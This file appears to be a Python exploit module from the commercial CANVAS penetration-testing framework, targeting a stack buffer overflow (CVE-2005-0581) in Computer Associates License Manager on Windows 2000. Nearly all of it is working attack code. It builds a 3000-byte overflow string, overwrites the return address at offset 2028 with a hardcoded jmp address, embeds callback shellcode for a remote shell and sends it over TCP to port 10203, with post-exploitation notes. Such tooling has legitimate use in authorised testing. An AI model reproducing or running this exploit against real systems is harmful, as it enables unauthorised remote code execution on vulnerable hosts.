#! /usr/bin/env python


#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="CA License Overflow"
DESCRIPTION="CA License Manager Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Computer Associates"
DOCUMENTATION["Repeatability"]="This is a one shot exploit."
DOCUMENTATION["CVE Name"] = "CVE-2005-0581"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0581"
DOCUMENTATION['CVSS'] = 4.6

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]

NOTES="""
    Process is lic98rmt.exe
    
    (lic98rmtd.exe is on port 10202)
    
    After getting in, you'll want to net [re]start "CA BrightStor Discovery Service"
    
"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=10203
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring="\x00\x20<>"
        self.ssl=0
        self.setVersions()
        self.version=1
        
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp
        self.versions[1]=("Windows 2000 SP4 ENG (jmp %ebx at 0x77886713)",0x77886713) 


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createWin32Shellcode(self.badstring,host,port)
    
    def test(self):
        """
        Any connection to this target makes it die (second connection closes port) :< 
        We need to someday go back and find a valid packet to send which
        does not close the connection.
        """
        #if you've run a portscan, this should return true successfully.
        return self.target.open_tcpport(self.port)
        #return 0 #always return not vulnerable
    
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.log("%s testing host %s:%s"%(self.name,self.host,self.port))
        #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s=self.gettcpsock()
        s.set_timeout(4)
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        teststr="A0 GETCONFIG SELF A <EOM>\r\n"
        s.sendall(teststr)
        try:
            data=s.recv(10000)
        except timeoutsocket.Timeout,m:
            #print m
            self.log("Nothing returned - possibly firewalled, but we'll assume vuln")
            self.version=1 #default version
            return 1
        except:
           self.log("Connection refused")
           return 0
        self.log("Recved: %s"%prettyprint(data))
        self.version=1 #default version
        return 1
        #being too proby can actually crash the service - it's made
        #of tissue paper. We'll just disconnect now. Hmm. It just bans connections.
        #lame.
        self.version=1
        return 1
        
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.version=1 #only one version for now
        
        if self.version==0:
            self.log("Automatic versioning not enabled.")
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect")
            return 0
        s.sendall(sploitstring)
        time.sleep(2)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0            
        
    def makesploit(self):
        """
        Construct the attack
        """

        #on win2k, jmp ebx gets us a pointer to the start of our string!
        #ffe3, ffd3
        #SP4: MPRAPI.773219db, SETUPAPI.77886713
        #msafd.74fd1273
        #licencry.00232b9c
        
        
        geteip=self.versions[self.version][1]
        self.log("Using geteip of 0x%8.8x"%(geteip))
        
        ret="GBR "+"A"*3000+"<EOM>\r\n"
        length=len(ret)
        ret=stroverwrite(ret,intel_order(geteip),2028)
        ret=stroverwrite(ret,self.shellcode,4)
        if len(self.shellcode)>=2028:
            self.log("Shellcode too long! len(shellcode)=%d"%(len(self.shellcode)))
            ret="" #no overflow.
        if len(ret)>length:
            self.log("Shellcode too long! len(ret)=%d"%(len(ret)))
            ret="" #no overflow.
            
        return ret



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
